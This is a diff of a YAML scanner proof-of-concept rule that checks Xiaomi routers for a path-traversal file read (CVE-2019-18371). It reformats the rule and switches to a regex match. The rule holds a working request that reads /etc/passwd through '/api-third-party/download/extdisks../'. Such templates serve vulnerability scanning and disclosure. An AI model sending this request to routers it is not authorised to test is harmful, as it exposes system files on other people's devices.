@@ -1,17 +1,15 @@
 name: poc-yaml-xiaomi-router-fileread
-# 脚本部分
 transport: http
 rules:
-    r1:
-        request:
-            method: GET
-            path: "/api-third-party/download/extdisks../etc/passwd"
-        expression: |
-            response.status==200 && response.body.bcontains(b'root:')
-expression:
-    r1()
-# 信息部分
+  r0:
+    request:
+      method: GET
+      path: /api-third-party/download/extdisks../etc/passwd
+    expression: >-
+      response.status==200 &&
+      "root:.*?:[0-9]*:[0-9]*:".matches(response.body_string)
+expression: r0()
 detail:
-    author: TavenLi
-    links: 
-        - https://github.com/tavenli
+  author: TavenLi (https://github.com/tavenli)
+  links:
+    - https://www.cve.org/CVERecord?id=CVE-2019-18371
